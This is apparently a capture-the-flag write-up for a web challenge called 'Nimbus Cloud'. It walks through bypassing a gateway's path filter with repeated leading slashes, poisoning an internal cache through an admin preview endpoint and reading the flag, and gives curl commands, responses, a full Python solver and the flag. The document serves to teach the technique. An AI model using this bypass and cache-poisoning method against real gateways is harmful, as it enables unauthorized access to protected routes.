---
title: "Behind_the_gateway"
date: 2026-08-22
description: 'Bypassing a path filter to poison an internal cache and expose the flag.'
category: '$n1phers-3-0-ctf'
discipline: 'web-exploit'
authors: ['abdieeuh']
draft: false
---

# Nimbus Cloud

## Summary

The edge gateway blocks paths whose raw request target begins with
`/admin-dashboard`. The backend normalizes repeated leading slashes, so
`///admin-dashboard/preview` reaches the protected admin route. The preview
endpoint then fetches an attacker-selected path with the trusted internal
identity and stores the response in a shared cache. Reading the matching cache
entry exposes the flag.

## Solution

### Step 1: Confirm the gateway boundary

The advertised admin route is blocked directly:

```text
$ curl -i http://13.203.69.239:31005/admin-dashboard
HTTP/1.1 403 Forbidden
Server: nimbus-gateway
...
The edge gateway blocks direct access to /admin-dashboard*.
```

The public dashboard discloses two relevant internal paths:

```text
/admin-dashboard/flag
/admin-dashboard/preview?path=<internal path>
```

It also states that the preview endpoint uses the trusted internal service
identity and stores the result in the shared edge cache.

### Step 2: Bypass the raw-path check and poison the cache

The gateway checks the raw path literally, while the backend normalizes
`///admin-dashboard` to the `/admin-dashboard` route. Therefore, this request
reaches the internal preview endpoint:

```bash
curl -i \
  'http://13.203.69.239:31005///admin-dashboard/preview?path=%2Fadmin-dashboard%2Fflag'
```

Relevant response:

```text
HTTP/1.1 200 OK
Server: nimbus-backend

Warmed
Fetched /admin-dashboard/flag using the internal service identity and stored
636 bytes in the shared edge cache (status 200).
```

### Step 3: Read the poisoned cache entry

The hidden cache viewer uses the same raw `path` value as its cache key:

```bash
curl -i \
  'http://13.203.69.239:31005/cache-view?path=%2Fadmin-dashboard%2Fflag'
```

Relevant response:

```text
HTTP/1.1 200 OK
Server: nimbus-backend
Content-Length: 636

<!doctype html>
<html><head><meta charset="utf-8"><title>Flag Vault — Nimbus Cloud</title>
<link rel="stylesheet" href="/static/style.css"></head>
<body>
<div class="nav"><div class="brand">Nimbus<span>.</span>Cloud</div></div>
<div class="wrap">
  <div class="card">
    <span class="badge ok">Served from internal cache</span>
    <h1>🚩 Flag Vault</h1>
    <p class="lead">Congratulations — this response was only served because a trusted internal
    fetch (or its poisoned cache entry) authorized it.</p>
    <div class="flag-box">$N1PH€RSxTCTF{smuggl3d_my_way_int0_the_po1s0n3d_cach3}</div>
  </div>
</div>
</body></html>
```

## Complete solver

~~~python
#!/usr/bin/env python3
from six.moves.urllib import response
import re
import requests

BASE = "http://13.203.69.239:31005"
ADMIN_PREVIEW = "/admin-dashboard/preview"
FLAG_PATH = "/admin-dashboard/flag"
CACHE_VIEW = "/cache-view"

def main() -> None:
    session = requests.Session()
    warm = session.get(
        BASE + "///admin-dashboard/preview",
        params={"path": FLAG_PATH},
        timeout=10,
    )
    warm.raise_for_status()
    if "Warmed" not in warm.text or "status 200" not in warm.text:
        raise RuntimeError("the internal flag path was not warmed successfully")

    cached = session.get(
        BASE + CACHE_VIEW,
        params={"path": FLAG_PATH},
        timeout=10,
    )
    cached.raise_for_status()
    body = cached.content.decode("utf-8")
    print(body)


if __name__ == "__main__":
    main()

~~~

```bash
python3 solve.py
```

## Flag

```text
$N1PH€RSxTCTF{smuggl3d_my_way_int0_the_po1s0n3d_cach3}
```
